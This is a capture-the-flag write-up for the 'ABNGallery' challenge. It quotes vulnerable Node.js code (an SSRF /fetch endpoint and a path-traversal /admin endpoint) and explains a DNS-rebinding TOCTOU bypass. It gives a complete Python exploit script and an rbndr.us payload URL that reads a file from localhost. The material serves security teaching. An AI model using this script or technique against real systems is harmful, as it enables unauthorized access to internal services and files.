# ABNGallery
## Challenge Overview
**Vulnerability:** Time-of-Check to Time-of-Use (TOCTOU) + SSRF

## Source code analysis
### `/admin` (LFI)
The application has an administrative endpoint that allows reading arbitrary files via the log parameter (Local File Inclusion/Path Traversal). However, it is protected by an IP check:
```javascript
app.get('/admin', async (req, res) => {
  if (ip.isPrivate(req.ip)) {
    try {
      const log = req.query.log;
      if (!log) return res.status(400).json({ error: 'Missing log parameter' });
      
      const filePath = path.join(LOG_DIR, log);
      const content = await fs.promises.readFile(filePath, 'utf8');
      res.type('application/json').send(content);
  
    } catch (e) {
      res.status(404).json({ error: 'Log file not found' });
    }
  }
  else res.send("permission denied");
});
```

Notice: We are connecting from a Public IP, so we cannot access `/admin` directly.

### `/fetch` (SSRF)
The application provides a feature to fetch images from remote URLs. This is a Server-Side Request Forgery (SSRF) vector.

```javascript
app.get('/fetch', async (req, res) => {
  const raw = req.query.url;
  if (!raw) return res.status(400).json({ error: 'Missing url parameter' });

  try {
    const timestamp = Date.now();
    const filename = `${timestamp}.json`;
    const filePath = path.join(LOG_DIR, filename);

    const logObj = {
      time: new Date().toISOString(),
      ip: req.ip,
      url: raw,
    };

    await fs.promises.writeFile(filePath, JSON.stringify(logObj, null, 2), 'utf8');
  } catch (err) {
    console.error('Log write error:', err);
  }

  let rest = extractHost(raw); 
  if (!(await hostIsPublic(rest))) {
    const u = new URL(raw);
    const path = u.pathname.slice(1) + u.search;
    return res.redirect(path);
  }

  try {
    const u = parseIncomingUrl(raw);
    const upstream = await fetchImage(u);

    const ct = (upstream.headers.get('content-type') || '').toLowerCase();

    res.type(ct);

    const body = upstream.body;
    const asNode = body && typeof body.getReader === 'function'
      ? require('stream').Readable.fromWeb(body)
      : body;

    if (asNode && typeof asNode.pipe === 'function') {
      return asNode.pipe(res);
    }

    const buf = Buffer.from(await upstream.arrayBuffer());
    res.end(buf);
  } catch (e) {
    const status = e.status || (e.name === 'AbortError' ? 504 : 500);
    res.status(status).json({ error: e.message || 'Upstream error' });
  }
});
```

## Exploitation: TOCTOU & DNS Rebinding
The application's security logic suffers from a classic Time-of-Check to Time-of-Use (TOCTOU) vulnerability.

Time-of-Check: The server calls hostIsPublic(hostname). This resolves the domain via DNS to check if the IP is public.

Time-of-Use: Immediately after the check passes, the server calls fetchImage(url). This function resolves the domain again to establish the connection.

**Solution**: We can use DNS Rebinding. We provide a domain that resolves to a Public IP during the first check (bypassing security) but resolves to a Private IP (127.0.0.1) during the second fetch (accessing localhost).

### Fail attempts:
- Direct Localhost (127.0.0.1): Blocked by ip.isPublic().
- Credential Bypass *(user:pass@host)*: Blocked by the Node.js fetch API, which throws an error if credentials are present in the URL.
- *IP Encodings (0177.0.0.1 / Octal)*: While this often works, in this specific Node.js/Alpine environment, the system resolver likely normalized the octal IP to decimal before the check, causing it to be correctly identified as private and blocked.

### The Solution: DNS Rebinding
We use a service like `rbndr.us` to create a dynamic DNS record.

**Format: \<PublicIPHex\>.\<PrivateIPHex\>.rbndr.us**

Payload: 7f000001.08080808.rbndr.us

7f000001 = 127.0.0.1 (Target)

08080808 = 8.8.8.8 (Bait)

Mechanism: The DNS server alternates responses with a TTL of 0, forcing the server to re-query DNS every time.

## Final script
```python
import requests
import time

# 7f000001 = 127.0.0.1
# 08080808 = 8.8.8.8
REBIND_DOMAIN = "7f000001.08080808.rbndr.us" 
INSTANCE = "<YOUR_INSTANCE_URL_HERE>"
LOCAL = "http://localhost:3000"
PAYLOAD_URL = f"http://{REBIND_DOMAIN}:3000/admin?log=../../flag"

def exploit(INSTANCE):
    print(f"[*] Payload: {PAYLOAD_URL}")
    
    session = requests.Session()
    
    for i in range(1, 50):
        try:
            r = session.get(f"{INSTANCE}/fetch", params={'url': PAYLOAD_URL}, allow_redirects=False, timeout=3)
            
            if r.status_code == 302:
                print(f"\r[-] Attempt {i}: Blocked (Resolved to Private) - Retrying...", end="")
            elif "permission denied" in r.text:
                 print(f"\r[-] Attempt {i}: Passed check (Public) but Fetch hit Public IP (Not Local) - Retrying...", end="")
            elif "DH{" in r.text:
                print(f"\n[+] SUCCESS! Found flag on attempt {i}:")
                print(r.text)
                return
            else:
                print(f"\n[?] Attempt {i}: Unexpected response: {r.status_code}")
                print(r.text+"\n")

        except Exception as e:
            print(f"\r[!] Error: {e}", end="")
            
        time.sleep(0.5)

if __name__ == "__main__":
    exploit(LOCAL)
```

**Notice:** The script will have some fail attempts before retrieving the flag due to race condition. 

## TL;DR
Vulnerability: SSRF protected by a flawed "Public IP" check susceptible to DNS Rebinding (TOCTOU)

Bypass: Use DNS Rebinding to trick the server.

Setup: Use a rebinding domain (e.g., rbndr.us) that alternates responses between a Public IP (8.8.8.8) and Localhost (127.0.0.1).

The Race:
- Check: Domain resolves to 8.8.8.8 $\rightarrow$ Passes security filter.
- Fetch: Domain resolves to 127.0.0.1 $\rightarrow$ Connects to Localhost.

Payload: http://7f000001.08080808.rbndr.us:3000/admin?log=../../flag:

Execution: Spam the request until the DNS race condition aligns to read the flag.